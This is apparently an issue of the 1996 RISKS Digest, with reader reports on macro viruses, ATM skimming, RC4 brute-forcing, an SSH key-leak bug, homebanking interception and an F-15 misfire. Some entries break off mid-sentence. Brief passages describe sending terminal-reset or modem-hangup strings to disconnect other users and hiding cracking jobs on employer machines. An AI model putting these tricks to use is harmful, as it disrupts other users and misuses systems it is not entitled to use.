I guess if you want to access stuff like this, don't do it from your

Spotted above the banner of the Feb 96 C/C++ User Journal:

<P>
But then I noticed this comment from Tim Parker in the Jan 11th RISKs:
<P>
&gt;2) develop a standard code wrapper scheme to provide authentication and<BR>
&gt;certification - Authentication (ala PGP) to verify that the file wasn't<BR>
&gt;altered after the creator created it - and that the creator is really the<BR>
&gt;creator)
<P>
The problem in the Win-Word case is that the creator of the document
that gave you the virus did not intend to send it.
<P>
Your computer reads the document, verifies the public-key, executes the
code, installs the virus and then proceeds to send out authenticated copies
of the virus with each document you send.
<P>
At the very best, this would only give you an audit trail. (Doubtlessly
compromised by the action of the virus itself)
<P>
If any of the data on any of your systems has the slightest value, then
it's time to take a good look at the track record of your software
suppliers at keeping data safe.  (If you don't like what you see, vote
with your pocketbook, I have)

<P>
Like the earlier "Zap" (cf. BKZAP.RVW), this book covers the various physical
ills that can be related to computer use.  Stigliani covers the basics, RSI
(repetitive strain injury) eyestrain, stress and EMF (electromagnetic fields).
More research has gone into this work than went into "Zap", and the
bibliography gives a good, broad sampling of related literature (if not,
sometimes, the best in a given field).  Throughout the book there are practical
exercises that can help the normal user deal with complaints.
<P>
In the Preface, Stigliani recommends the book to managers and business people.
This advice makes a lot of sense, since managers have much more control over
the work environment in the office.  Unfortunately, but in line with many other
similar works, she fails to provide justification and background which would
allow business owners to make a business case for committing the resources
necessary to reorganize the workspace, and purchase more "healthy" equipment.
In addition, business people may be uncomfortable to find some suggestions
(such as the exhortation to ameliorate the effects of EMF by using crystal
pendants) and the general tone of the writing to be a bit "New Age".  It would
be a mistake to see the book as "flaky" because of this minor predilection: the
important parts of the book are thoroughly researched and well supported.
<P>
Practical help for users, a useful guide for managers and a good introduction
for health practitioners.

I checked the NIST gopher server (gopher-server.nist.gov) and found press
releases about the leap second.  This is the 20th time they have done this
so they should have understood the issues involved. It has been done on June
30 as well as Dec 31 in the past. (UTC is "Coordinated Universal Time" in<BR>
French.)
<P>
There was nothing explaining the foul-up, bit I did notice a companion
article that Curt W. Reimann, first director of the Malcolm Baldrige National
Quality Award, is retiring from federal service.  Perhaps this had
something to do with it!   ;)
<P>
&gt; From the Press Release:<BR>
&gt;     This year's leap second will be inserted at 23:59:60 UTC on Dec.<BR>
&gt; 31, 1995. That's the scientific way to say it will happen just before 7<BR>
&gt; p.m. EST on New Year's Eve. The last minute of the old year will<BR>
&gt; actually be 61 seconds long, and thus the new year will start a second<BR>
&gt; later than it would without the leap second.
<P>
Clearly, a legitimate time of 23:59:60 flies in the face of every date/time
string validation routine ever written.

<P>
I would like to tell you what I read in the "Rheinische Post", a German
newspaper, on 12 Jan 1996.  I hope that I am able to translate it correctly.
<P>
It seems that at least 100 owners of an "Eurocheque Card" (EC-Card), a card
that one can use at each cash dispenser in Europe (not a credit card), were
the victims of a fraud. The people who committed the crime stole about DM
400,000 (about US$ 270,000) from their accounts. The investigators think<BR>
that they had manipulated two cash dispensers of the "Deutsche Bank", the
biggest German bank, in a way that allowed them to get access both to the
data on the EC-cards and the Personal Identification Numbers (PINs). Then
they must have copied the data to blank cards. This happened near the border
to the Netherlands and the criminals went there in order to withdraw the
maximum amount of 1,000 "Gulden" (about US$ 750) per day. They did so for
several days and were not arrested yet. The customer's damage will be
compensated by an insurance, the "Deutsche Bank" announced. They also said
that this did not happen for the first time. Other banks' cash dispensers
had been manipulated before, too.
<P>
How can it be possible that a bank's cash dispenser is manipulated that
way? I've thought of "faked" cash dispensers before, too, but real ones?

Right general idea, anyway ... it was Schrodinger's Cat III: The Homing
Pigeons.  E.g.:
<P>
"[...] How would you feel after Potter Stewarting for four hours?"
"Tired."
<P>
Wilson's most notable books (the Schrodinger's Cat Trilogy and the
Illuminatus!  Trilogy) cover topics near and dear to the hearts of RISKS
readers--as well as readers who are simply paranoid.  In Wilson's fiction,
governments, corporations and institutions in general are run, or
manipulated, by people who unashamedly put self interest ahead of all other
goals.  In other words, everybody acts like the greedy, sneaky bastard you
fear he or she might be.  Maybe the books are not realistic ... but they
sometimes ring truer than the sayings of the Watergate-era governments that
inspired them.  Or even present-day governments.
<P>
Conspiratorialists and others who just find this sort of thing entertaining
should also try out Steve Jackson's Illuminati card game.  Of course Steve
Jackson can tell you about the RISKs of tangling with the government ....

[Editor's note: The names sending this to me were deleted, to protect
everyone. This is a fascinating letter, for a number of reasons. What
happened was that some mail message blew up the AOL mailer, causing the host
machine to crash, and the poor schlep getting the mail message complained to
the listmom, assuming that said person was a programmer and not simply
someone who maintains a mailing list. On the one hand, we can laugh at it,
on the other hand, that the bug exists in both the Mac and Windows versions
means that they are doing some really cool cross-platform development. On
the third hand, I'm sure there are a lot of people who would love to know
what plaintext mail message will crash an AOL account. For the
mischief-minded, let me say in advance that I don't know. -- jdcc]
<P>
Real e-mail from a real AOLer to a local mailing list manager.
<P>
Names removed to protect the ignorant.  :-)
<P>
-----
<P>
&gt;&gt;Some of the mail I receive from the ** mailing list does not open properly<BR>
&gt;&gt;in my mail reader, AOL for Windows, 2.5.  When I click on an e-mail from the<BR>
&gt;&gt;** mailing list, AOL freezes and I have to reboot the system.  It doesn't<BR>
&gt;&gt;happen with every single piece of ** e-mail, only some of them.  The same<BR>
&gt;&gt;thing also happens on my husband's AOL account.  He has AOL for Macintosh,<BR>
&gt;&gt;2.6.<BR>
&gt;<BR>
&gt;Please refer this problem to AOL tech support.  I don't believe<BR>
&gt;the problem is with the mail message.  It's much more likely to be with<BR>
&gt;the mailer reader.
<P>
**, this is NOT an AOL tech support problem.  My husband was able to solve
the problem for me, and for himself, by going through each message
downloaded, one at a time, until he hit the one that made AOL freeze.  After
deleting this message, all problems were gone.  I would therefore suggest to
you, that if it is at all possible, run some sort of virus checker or
something on postings to the list before you send them out.  I am not a
programmer, so I am not sure how to go about this, or if it is even
possible, so please don't flame me again.  Just see what you can do to get
the list working properly.  Thanks.

While skipping through the web one day, I came across a Cryonics web page.
It certainly seems like its important for everything to work right while you
or a loved one are being preserved, and the web page contains a number of
statements to reassure the potential customer. On the other hand, for RISKS
Digest readers, the statements made may not be so much reassuring, but
rather showing a sense of false confidence.
<P>
For example:<BR>
"CryoSpan...employs multiply redundant, fail-safe computer monitoring of
liquid levels in patient dewars that are situated in reinforced-concrete
underground vaults."
<UL>
<LI>Is "fail-safe" meant to imply "defect-free"? Are all the redundant
computers sharing communication or power lines? Are these
reinforced-concrete underground vaults as good as the sometimes-leaky ones
used to store nuclear and other hazardous waste?
</UL>
"These vaults offer unprecedented protection against earthquakes, fires,
floods, and vandalism."
<UL>
<LI>What about power outages? Communications cables chewed through by rodents?
Faults due to inadequate workmanship, such as coolant leaks?
</UL>
I'd be interested in knowing if there have already been anecdotes recorded
about failures in cryo-preservation environments.

&gt;Subject: Single computer breaks 40-bit RC4 in under 8 days<BR>
&gt;<BR>
&gt;MIT Student Uses ICE Graphics Computer<BR>
&gt;To Break Netscape Security in Less Than 8 Days:<BR>
&gt;Cost to crack Netscape security falls from $10,000 to $584<BR>
&gt;<BR>
&gt;CAMBRIDGE, Mass., January 10, 1996 -- An MIT undergraduate and part-time<BR>
&gt;programmer used a single $83,000 graphics computer from Integrated Computing<BR>
&gt;Engines (ICE) to crack Netscape's export encryption code in less than eight<BR>
&gt;days. The effort by student Andrew Twyman demonstrated that ICE's advances<BR>
&gt;in hardware price/performance ratios make it relatively inexpensive -- $584<BR>
&gt;per session -- to break the code.<BR>
&gt;<BR>
&gt;While being an active proponent of stronger export encryption, Netscape<BR>
&gt;Communications (NSCP), developer of the SSL security protocol, has said that<BR>
&gt;to decrypt an Internet session would cost at least $10,000 in computing time.<BR>
&gt;<BR>
&gt;Twyman used the same brute-force algorithm as Damien Doligez, the French<BR>
&gt;researcher who was one of the first to crack the original SSL Challenge.<BR>
&gt;The challenge presented the encrypted data of a Netscape session, using the<BR>
&gt;default exportable mode, 40-bit RC4 encryption.  Doligez broke the code in<BR>
&gt;eight days using 112 workstations.<BR>
&gt;<BR>
&gt;"The U.S. government has drastically underestimated the pace of technology<BR>
&gt;development," says Jonas Lee, ICE's general manager.  "It doesn't take a<BR>
&gt;hundred workstations more than a week to break the code -- it takes one ICE<BR>
&gt;graphics computer. This shuts the door on any argument against stronger<BR>
&gt;export encryption."<BR>
&gt;<BR>
&gt;Breaking the code relies more on raw computing power than hacking expertise.<BR>
&gt;Twyman modified Doligez's algorithm to run on ICE's Desktop RealTime Engine<BR>
&gt;(DRE), a briefcase-size graphics computer that connects to a PC host to<BR>
&gt;deliver performance<BR>
&gt;of 6.3 Gflops (billions of floating point instructions per second).<BR>
&gt;According to Twyman, the program tests each of the trillion 40-bit keys<BR>
&gt;until it finds the correct one. Twyman's program averaged more than 830,000<BR>
&gt;keys per second, so it would take 15 days to test every key.  The average<BR>
&gt;time to find a key, however, was 7.7 days.  Using more than 100<BR>
&gt;workstations, Doligez averaged 850,000 keys per second.ICE used the<BR>
&gt;following formula to determine its $584 cost of computing power: the total<BR>
&gt;cost of the computer divided by the number of days in a three-year lifespan<BR>
&gt;(1,095), multiplied by the number of days (7.7) it takes to break the code.<BR>
&gt;<BR>
&gt;ICE's Desktop RealTime Engine combines the power of a supercomputer with the<BR>
&gt;price of a workstation.  Designed for high-end graphics, virtual reality,<BR>
&gt;simulations and compression, it reduces the cost of computing from $160 per<BR>
&gt;Mflop (millions of floating point instructions per second) to $13 per Mflop.<BR>
&gt;ICE, founded in 1994, is the exclusive licensee of MeshSP technology from<BR>
&gt;the Massachusetts Institute of Technology (MIT).<BR>

<P>
During October 1995 a Japanese air force fighter plane shot down another
fighter plane involved in a combat training by mistake.
<P>
What happened was this.
<P>
Two F-15 planes took off for combat training.  One of them apparently was
carrying LIVE missiles.  The main switch that activates firearms on the
airplane was off by instruction.  However, somehow, when the pilot triggered
fire button during the interception training, the sidewinder missile was
fired and shot down the other fighter plane nicely.  The pilot escaped by
parachute safely.
<P>
Of course, the main question is why on earth an airplane in a training needs
to carry live munition, sidewinders missile at that. Airforce officials
claim that the airplane in question is routinely used for scramble mission
to intercept possible intruders and thus the taking the missiles off the
airplane and reloading for occasional training is a time consuming task to
be avoided. Newspaper article pointed out that the airplane needs refueling
before and after the mission that takes time and missiles might as well be
taken off and reloaded anyway for the training.
<P>
An article regarding the tentative investigation report appeared in
newspaper last week.  According to the report,
<UL>
<LI>There seems to have been a electrical mishap caused by static
electric charge buildup. This seems to activate the firearms system
although the master firearm switch was in off position.  Further
investigation is planned.
<P>
<LI>With detailed briefing of the pilot, who accidentally fired the missile,
it is now believed that the firearm computer displayed "lock cue" or
whatever that is, on the firearm status screen when the pilot
locked on the friend's airplane  as part of the training.
</UL>
According the article, the "lock cue" or whatever is shown ONLY WHEN
the master firearm is turned ON.  With other signals displayed on the
screen, this particular symbol or message (I am not sure what that is
from what I read in the newspaper) indicates that the master firearm
system is activated and the pilot can fire the missile really.
<P>
Now the airforce officials are said to wonder if the pilot in
question could somehow sense that something was amiss with the
onboard firearm computer system and aborted the lock-on training
prematurely. (Presumably deducing that firearm master switch is off,
and "lock cue" should no appear, and why am I seeing it on the screen!?)
<P>
Now the risk, of course, is obvious.
<P>
The plane should not have carried the live missile in the first place
since this was not the intended part of this routine training.
(Airforce officials were saying that they would have disarmed the
airplane if they felt they had enough time.)
<P>
Secondly,  we should not depend on the stressed operator of computers
(in this case, the pilot) to detect the anomaly of the computer
operation so casually.
If the operator sits in a comfortable chair at a desk looking at
computer display in a quiet environment, we may be justified in
expecting the operator to notice a strange message on the screen.
But a fighter plane pilot in a combat exercise is hardly in a position
to notice that something is wrong with the on-board computer!? ("What
is the message on the screen? SYSERR 1043. Hmm stack overflow of
numerical signal processor that computes the trajectory of missile?")
<P>
As a matter of fact, there was even a speculation that the poor pilot
had not turned off the main firearm switch as instructed and he was the prime
culprit until these initial charges turned groundless.
Poor guy.
<P>
I feel that Japanese authorities tend to focus on human error side of
these accidents when, in fact, there may be inherent systems problems.
I don't know if this is true in other countries.
<P>
Since I noticed that there seem to be a lot of readers of Risks who seem to
have background in the military and/or military-related industries,
the above may be of some interest.
<P>
PS: Regarding the Japanese breeder reactor accident on Dec. 8th, 1995,
I reported last year, someone questioned the wisdom of using
chemically active sodium for the secondary loop. Well, the breeder
DOES use Sodium (Natrium, Na) for both primary and secondary cooling
loop.  It is a decision made by the Japanese design team.
French breeder reactor used sodium only for the primary loop.
<P>
Japanese investigators who have been analyzing the fracture of the
secondary pipe, from which hot liquid sodium escaped, found that the
fractured casing of temperature sensor broke the inserted sensor as a
whole and liquid sodium escaped from the hole punched there. A part of
sensor casing is missing. It is believed to get stuck somewhere in the
secondary loop piping. The fracture itself is believed to be caused by
metal fatigue: the casing must have vibrated about half a billion
times during the operation. The vibration is caused by the interaction
of the sodium flow and the vortex behind the sensor.
<P>
Some heads rolled because there was an effort to cover up the severity
of the accident by the on-site managers (and possibly people in the
headquarters of the operating corporation). It has been a big scandal
for the last three weeks or so.
<P>
A video taken by the operating crew immediately after the accident was
edited and the juicy part of the video was NOT shown to the public
until the video taken by the alarmed local town official was broadcast
over and over on Japanese TV. Someone finally fessed up and three
(initially reported two, but I think it now counts three) different
VCR tapes recorded immediately after the accident were found in the
desks/locker of some of the employees. Old timers might recall the
movie "China Syndrome", in which an operating company tried to hide
the structural weakness of a reactor caused by sloppy construction and
checking.
<P>
A tragedy is that one man of the operating company who handled the
interviews concerning the hiding of these key tapes committed suicide.  It
seems that he could not handle the pressure of interviewing his former
colleagues and underlings and nailing the culprit of concerted efforts to
hide the tapes. Also, he had to answer tough questions from journalists at a
widely broadcast PR conference.  (Maybe another risk: Don't let someone in
the suspected organization to police itself if the charges are serious
enough. They may not go down to the bottom of the problem, and in the
Japanese case, someone might commits suicide!)
<P>
Well, the truth has caught up the fiction and may surpass it in Japan.

<P>
During the critical engineering sequence, the sequence of commands that
controlled the spacecraft during the Probe Relay and Jupiter Orbit
Insertion, most of the spacecraft commands were issued twice (in case of
problems with the first issuance).
<P>
When the command to fire the main engine for the insertion burn was
issued for the second time, a "command constraint violation" was issued,
since that command is illegal in the state the software entered after
the command was issued the first time.  This was expected, and not
a problem.
<P>
When a command constraint violation is issued, a bit is set in a
status word, and remains set until cleared by a direct command.  The
particular bit in question was scheduled to be cleared after the turn
during which we had the incident.
<P>
The standard package of commands used to perform the turn, however, contains
a command that checks the fault status word for non-zero bits.  When it
found one, it cancelled the active sequence of commands, and called a
subroutine that safes the instruments, configures the telecom system to
maximize commandability, and widens the deadbands that must be exceeded for
the spacecraft to perform autonomous attitude and spin rate maintenance.

<P>
BTW, the NTSB report showed the cause of the crash to be miscommunication.
I.e., the original pitot tube that had pitot heat had been replaced with one
that did not.  This information was not properly communicated to the test
team.  The pilot had recognized the pitot was icing, turned on pitot heat
and requested ground control to remind him to turn it off.  Ground control
acknowledged his request.  There was a backup flight mode that did not
depend on airspeed that would have been engaged if it was known at the time
that the pitot tube did not have a heater.  Ground support then informed the
controller that there was no pitot heat, twice.  Too late.
<P>
Fault was found with not correctly recognizing and communicating the risk of
substituting the pitot tube.

<P>
Because Delta 153 thought a take-off clearance for American 153 was
instead for them, there was a near-miss at JFK on 5 Jan 96. Scott Lucero
(<A HREF="/Risks/17.64.html">RISKS-17.64</A>) saw two RISKS:
<OL>
<LI>not designing systems to recognize these [..] situations, and
<LI>a risk [with] a growing number of customers in a limited address space.
</OL>
As airports get busier, [..] incidents [..] could happen more often.
<P>
I quote from the FAA Airman's Information Manual 4-34. Aircraft Call Signs.
<P>
a. Precautions in the Use of Call Signs--<BR>
<OL>
<LI>Improper use of call signs can result in pilots executing a clearance
intended for another aircraft. Call signs [begin italics] should
never be abbreviated on an initial contact or at any time when other
aircraft call signs have similar numbers/sounds or identical
letters/numbers [end italics] [...]
<LI>Pilots, therefore, must be certain that aircraft identification is
complete and clearly identified [sic] before taking action on an
ATC clearance. ATC specialists will not abbreviate call signs of air
carrier or other civil aircraft having authorized call signs.
</OL>
The call sign of American 153 is `American one-five-three', and Delta's is
similar. Either the controller breached regulations and abbreviated the call
sign or Delta 153 breached AIM 4-34.2. The procedures are there.  Thus
Lucero's Risk 1) does not pertain. His Risk 2) only pertains if based on an
assumption that as traffic increases, the number of aircraft handled by a
single controller will increase. This is not so--there's an upper limit to
traffic handled by a single controller.

Lately I have been seeing a broad spectrum of postings from people,
some that seem to go only part
of the way across the terminal
and some others that not only use up the entire eighty characters on the screen but keep
going far past the end of the line and wrap [or get lost] on most 80 character terminals.
<P>
I was helping my wife do some research on the net and came across one of her
postings that wrapped. Seems she had been using Eudora with a tiny font
setting that was not wrapping until 90 characters had been sent. Playing
with the fonts, I found a large one that wrapped with only forty characters
on the line. Both appeared to be using the whole screen.
<P>
Might mention that Eudora/Windows seems to be the mail reader of choice for

<P>
A German private TV channel (SAT 1) displayed, Monday Jan.22 night (10 pm),
a demonstration of how easily homebanking may be attacked in Germany. In
this demo, a person used T-Online (a navigation tool similar to CompuServe)
to send his ID, PIN, the amount to be transferred (500 DM) and the account
to which to transfer, plus a transaction number (TAN) via telephone line.
All these data were intercepted on a portable connected to the user's phone
line in the basement of the building (indeed, most telephone boxes are
rarely locked). Actions of the customer and the "hacker" were shown in
parallel, so one could see all data (including PIN which was not displayed
on the Customers' screen) on the hackers' display. Before the customer could
start the booking process on the bank computer by sending the requestor, the
hacker interrupted the telephone connection. As he now possessed all
relevant "secret" information of the user, he now started an order to
transmit 5,000 DM from his victim's account to another one, successfully (as
the customers' vouchers proved. After the demo (about 10 minutes), a short
interview (with the author of this report) discussed evident risks; it was
made clear that software solutions are available since some time, to replace
the old PIN/TAN structure with digital signatures and to encrypt sensitive
data using asymmetric encryption.
<P>
Risks? Presently, there are several risks in telephone-based homebanking.
First, ALL sensitive information is transmitted in cleartext. Secondly,
interception of line-based communications of German Telekom is easily
possible at several sites, from the basement of a customers' house where
lines from different customers are collected in a unit, to units
collecting lines from several blocks, streets etc. Thirdly, in contracts
between banks and customers, the latter will often have difficulties to
prove that an order carrying their personal ID, TAN etc was NOT issued
from them, esp. when there is evidence that the order came from the
customers' telephone line (though not from his telephone :-). Customer
protection (both technically and legally) therefore requires immediate
action, as Chaos Computer Club commented in press.
<P>
Interestingly, German banks offer enterprises a secure solution based on
RSA-licensed encryption software. So far, this is NOT offered to private
customers as it canNOT interoperate with T-Online. Financial institutions
are discussing presently a solution (either with a chipcard including sort
of DES or a solution using an RSA-implementation with 784 bit key, which may
be distributed via diskettes) but it is unclear when this solution will be
available. As long as such solution is not available, "every day may become
payment day even for the most lousy hackers" as one German newspaper (TAZ)
wrote.

<I>Thu, 18 Jan 96 12:19:25 EST</I>
<P>
I found a security hole in the ssh client of SSH 1.2.0 ("Secure Shell", a
public-key based drop-in replacement for rlogin, rsh, and rcp).  Very
briefly, the bug allows any user on a system to obtain that host's secret
key (undetected) and thereafter masquerade as that host from anywhere on the
net until the key is changed.  Anyone that is interested in details of the
vulnerability can contact me or the ssh mailing list (<A HREF="mailto:ssh@cs.hut.fi">ssh@cs.hut.fi</A>).
<P>
This bug is RISKS material because of what caused it.  The ssh client has a
mode in which it reads and uses the host's secret key for authentication.
The secret is installed in /etc and readable only by root, so ssh has to be
setuid-root to access is.  Naturally, since this is a security system, the
author went to considerable effort to make sure the program did not actual
use its root privileges any more than absolutely necessary.  Generally,
that's a good idea.
<P>
The problem in this case is that ssh gives up its root privileges TOO
SOON.  The flow of control looks like this:
<P>
acquire root privs<BR>
read secret key<BR>
release root privs<BR>
use secret key<BR>
erase secret key from memory
<P>
The result is the host's secret key is still in memory when the program
releases its root privileges, making it quite easy for a user obtain that
information.  Presumably, it would be much harder to read the processes
memory while it was owned by root.  So if the process held on to its root
privileges until later in the flow of control (after the key memory was
erased), this bug might not exist (for implementation-specific reasons this
may be tricky for the author to do, but in principle there is no reason it
can't be).
<P>
If the author had done a data-flow analysis of the program (examining
program state on entering and leaving the root section of code), this bug
probably would have been discovered earlier.  But instead he was just "very
careful", and released root privs as soon as they were no longer needed to
access the critical data.  His behavior is perfectly understandable, and
generally correct---but in this case, sadly, wrong.
<P>
The lesson is not new.  Designing secure systems is HARD.  It takes a
lot of thought, and a lot of examination by security experts before a
system can be trusted.

Hoo! I got a lot of private feedback about my posting regarding floating
point number formats! Thank you all of you who did respond and what's more
responded in a positive and encouraging way. I went off a little
prematurely, so, drawing from the information thrown at me :-) from those
replies, I now need to clarify a few things for the readers of RISKS.
<P>
My original post was in response to concern of accuracy problems when
floating point numbers expressed in decimal are stored in binary. Storage of
numbers like 1/3 or 22/7 will continue to be a problem even in decimal
(thank you Keith Thompson). But this is a problem we can understand deal
with better in decimal than in binary because we humans have been trained to
think in decimal numbers from a young age. A radix-10 or radix-100 system
only gains you accuracy to exact powers of ten - but that appears to be what
people are asking for! (...which was, incidentally, point.)
<P>
Microsoft's proprietary format was, it turns out, quite appropriate for what
it was designed for (thank you Matthew Healy). Quite simply, they
bastardized the IEEE 754 format to make it faster on the CPU technology of
the time - which was, remember, sans numeric co-processor. In other words, a
classic engineering tradeoff. Since numeric co-processors are now much more
common, and CPUs are generally much faster now anyway, Microsoft have gone
back to the IEEE format for their software.
<P>
But IEEE are very aware of the accuracy problems of IEEE 754 (thank you D.
Jason Penney). In fact, they even have a floating point number standard
using radix-10 - it is called IEEE 854. The problem is that far too many of
the people using *binary* floating point should be using *base-ten* floating
point! Part of the reason for this is perception. Binary floating point is
presented as the pinnacle of computer number representations - when it is
simply "horses for courses". When ray-tracing (for instance), binary
floating point is just the ticket. On the other hand, on a financial
spreadsheet, base-ten binary is much more suitable - if slower.
<P>
It is a decidedly human Risk.

<A HREF="/Risks/17.65.html">RISKS-17.65</A> mentioned the theft from the UN of four computers which held
data on human rights violations in Croatia.  The risk of not having backups
was mentioned, but there are other issues to be considered:
<OL>
<LI>There is definite risk in allowing people to identify the machines or
directories on which sensitive data is kept.  You might as well hang a
"target" sign on it.  On our network, for example, I would never establish a
directory called
"G:\PERSONNEL\PAYROLL\SALARIES" or
"G:\MEMOS\REPRIMAND\SEXUAL".
There are too many tools available for casual browsing of systems.  Hiding
the directories may not help; Norton Utilities' File Find, for example,
ignores the hidden flag.
<P>
<LI>I don't know if the UN thought about it or not, but the data files on
these machines should have been encrypted, since they probably contain the
names of people who informed on human rights violators.  These informants
should be notified to watch their backs.
</OL>
I know of a couple of legal offices that have PCs with Syquest or Zip
drives; every case has one cartridge devoted to it, and these are removed
from the machine and locked in a safe when not needed.  Might be a good idea
for the UN's rights violation investigators; I really believe that the PCs
were stolen not for intrinsic value but for the data.

Heck I've been saying for two years now that a special-purpose sieve could
break RC4-40 in an average of little over 3 hours. Just a matter of knowing
what to use, not CISCs or RISCs but DSPs. (Incidentally, I have seen quite a
few people using the 3-hour figure for DES. Maybe with 65k sieves, but not
with one.)
<P>
Even at 40 Mhz (example above is based on 150 Mhz) you are talking less than
12 hours so what is surprising about several days ?
<P>
Add in the fact that RC4 (algorithm was published on sci.crypt last year) is
much simpler than say DES, and that breakage via brute force comes
reasonably quickly is not surprising to anyone who has studied it, just
re-enforces the fact that 40 bit encryption is little better than no
encryption at all.
<P>
Given the fact that the next generation of game controllers will operate
at over 100 Mhz, the real question should be "Who will be the first to
break 40-bit Netscape encryption on a Playstation ?"

I've been amazed from the beginning that people are justifying an encryption
algorithm by saying it is "too expensive" to crack. I could crack keys at no
cost to myself, and if I'm willing to steal someone's money, I'm certainly
not going to be concerned about what it is costing someone else for me to
crack keys. At my college I didn't have to pay for CPU time. At my current
job, I have access to over 200 Sun Workstations (probably over 300...) on
which I could run user processes.  I doubt any of them are monitored closely
enough to catch an innocently named process that has been niced to avoid
hogging the CPU and gets restarted periodically to hide cumulative CPU time.
I also doubt that my free access to CPU cycles is all that unusual.

This seems like a low tech risk hidden mistaken for a high tech risk.
<P>
Anyone with any knowledge of weapons knows you never point a loaded weapon
at anything you don't intend to shoot even if the "safety" is on.  Imagine
pointing a loaded handgun at someone an pulling the trigger and saying "It's
OK, the safety is on." (As used here, "safety" means "a device that keeps a
weapon from firing unintentionally when the trigger is pulled.")
<P>
The fact that the F-15 is a multi-million dollar, highly complex system only
makes it more necessary to follow basic safety precautions.  Whether or not
the "safety" failed or the operator misused it, it's a basic mistake to bet
a life on the safety.
<P>
Actually, it's usually very bad form to point even an UNloaded weapon at
someone.  Everyone knows there are "ammunition fairies" who put ammunition in
unloaded guns when you aren't looking.  (OK, maybe there aren't ammunition
fairies, but people who believe in them live longer than those who don't.  8-)

People seem to have some misconceptions about how the cryogenics people
work.  Sure, they have monitoring systems and such like that use
electricity, but basically they stick you (or at least your head if you have
"gone neuro") inside a big Dewar Flask -- if the power fails no problem for
quite some time.  Earthquakes are a much worse "risk".  For an interesting
view of the cryogenics world, read Ed Regis's "Great Mambo Chicken" and the
chapter on cryogenics in "Death: The trip of a Lifetime", which is the book
of the US Public TV series of the same name. (Both also well worth reading
for the other material they contain)

Last Sunday I posted a news message on comp.lang.eiffel. The next day I

Apart from the enormous potential for disaster, what I find interesting is
the continuous gradation that exists between, at one extreme, behavior that
is considered perfectly normal (all kinds of strange beasts foraging
everyone's information repositories, without any warning let alone requests
for permission, at all hours of the day and night), and, at the other end,
activities that can land people in prison (e.g. the Great Internet Worm,
whose author has maintained was an innocent experiment gone awry). I don't

the reprehensible.

I have an AOL account, and I think I can explain what happened. AOL has had
severe mail server problems lately. The way the AOL mail download works is
this :
<OL>
<LI> AOL downloads a TOC for all the mail to come to a binary file<BR>
<LI> The messages get downloaded into the file<BR>
<LI> Attachments get downloaded
</OL>
Because of the mail server problems, the TOC for a message was getting
downloaded, without the message itself. To the user, everything looks
okay, but when you try to open an empty message, AOL hangs and it is
ctl-alt-del time. Sometimes a power cycle is necessary.

It may not be AOL's software at all. It could be in a gateway
transmitting packets from AOL to the user, or even in the user's own modem
or terminal emulation software.
<P>
A few years ago I reported on comp.risks my experiences with a
gateway that would hang and need to be rebooted if it saw more than a
handful of lines like this one go by:
<P>
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<P>
Since it was the gateway itself causing the problem, ANY attempt to
transmit the offending string uncompressed and unencrypted would cause the
problem: ftp, e-mail, or merely scrolling the message by as text on your
screen!
<P>
I'm told some brands of modem will promptly disconnect if they see
the string "+++" go by at any point in the data stream.
<P>
And surely people remember back in the days before X how much fun it
was to send "^[c", the ANSI terminal "reset" sequence, to another user's
terminal? This could be done in many ways: you could put it in your ".plan",
or e-mail it to them, or simply send it to their screen if you had
permissions to do so. On many brands of terminal it would cause the
victimized user to be instantly disconnected!

This has been a problem with AOL's e-mail client (the Windoze version, at
least) for the last two releases. The problem is quite simple, really.  When
a user requests to check for new mail using AOL's software, the machine
first retrieves a list of mail headers, then (if requested) retrieves the
actual body of each mail item.  If the client machine loses carrier or is
otherwise disconnected during a "flashsession" (batch mail
retrieval/delivery) or in the middle of retrieving an individual piece of
mail after the list has been retrieved, the software is left with a bodyless
header (kind of gruesome, really). Trying to read that piece of mail will
then lockup the AOL client software. This is obviously not a virus (unless
those jokers at the San Jose Mercury are including virii with their news
feeds?).
<P>
Deleting the dismembered headers in the locally stored client list of mail
headers "fixes" the problem, although that bit of mail is then lost.
<P>
Because of work, I've had to suffer with this bug for some time now. AOL's
staffers just don't seem to understand the problem, in spite of many and
varied attempts to explain. Sometimes I think they only receive and read
headers themselves. But how about the spontaneously disappearing &gt;hundreds&lt;
of pieces of locally stored mail? That's another story...

"Fred Sterling" is a pseudonym for a charlatan who has been advertising his
trash via massive e-mail spams.  He has been thrown off of various sites for
these activities, and fincon.com is his latest hideout.  He is the cause of
the development of e-mail filters, as his junk mail was causing problems for
high-cost international UUCP and FIDO connections.
<P>
The risk?  Only the usual tragedy of the commons (unless you count the
embarrassment of a certain moderator).  See news.admin.net-abuse.misc for
further details.

<P>
Thanks to an unprecedented number of you for your comments noting that RISKS
got spammed.  I generally make a very serious effort to reject all overt
advertisements, spams, and sneaky attempts to abuse the Internet.  In
particular, the moderator of a group dedicated to risks in the use of
computers must never let his attention span wander, not even for a moment.
But, somehow, that item slipped into <A HREF="/Risks/17.65.html">RISKS-17.65</A>.  (The worst part is that I
surprisingly forgot about Rob Slade's VERY EXPLICIT WARNING about "Fred
Sterling" in <A HREF="/Risks/17.54.html">RISKS-17.54</A> ["Pick a personality type, any personality type
..."] and also that I did not even try the dratted website -- which I
usually do before even considering posting anything like that.  That
certainly would have jarred my memory and my sensibilities.)  [Yes, Dan, I
am indeed embarrassed!]
<P>
This is just one more reminder of the risks in the open Internet and is a
harbinger of the problems we will increasingly be having.  Also, don't
forget the risks of security problems (especially Trojan horses) in the
network interfaces.  I'm waiting for the first really successful sucker
punch, which will undoubtedly lead to draconian legislative restrictions,
which will in turn lead to more discussions on this topic in RISKS.
<P>
At any rate, I appreciate the messages from all of you who objected to its
inclusion.  In response, I have done something rather unusual -- removing
the offending item from the archive copy of <A HREF="/Risks/17.65.html">RISKS-17.65</A>.  (Other archivists
may feel free to pick up the new copy if they wish to follow suit.)
Especially in the light of my having let through an obviously unworthy
contribution, I also must apologize to those of you who have submitted truly
worthy messages that have not (yet) made it into RISKS.  The volume of
submissions has been enormous lately, and I have a particularly tricky task
of selecting what I hope will be most interesting for you, from among a very
large queueueueueueueue, while not incurring the wrath of others for
including junk.  Always feel free to poke me if you feel I have ignored a
particularly vital contribution of yours (even though that will further
increase the volume I must deal with!).  Many thanks for your patience.  PGN

<P>
In the light of this subject matter, I'd ask for my electronic address not
to appear in plaintext in this message, although to solicit genuine replies
I am including enough information to construct it.
<P>
I'm rather disappointed to see this blatant advertising spam reproduced
here; despite the "If you wish to be removed" line, they've simply dredged
the net for as many e-mail addresses as they can; I know dozens of people
who've received this message, so it seems they have been mailing every
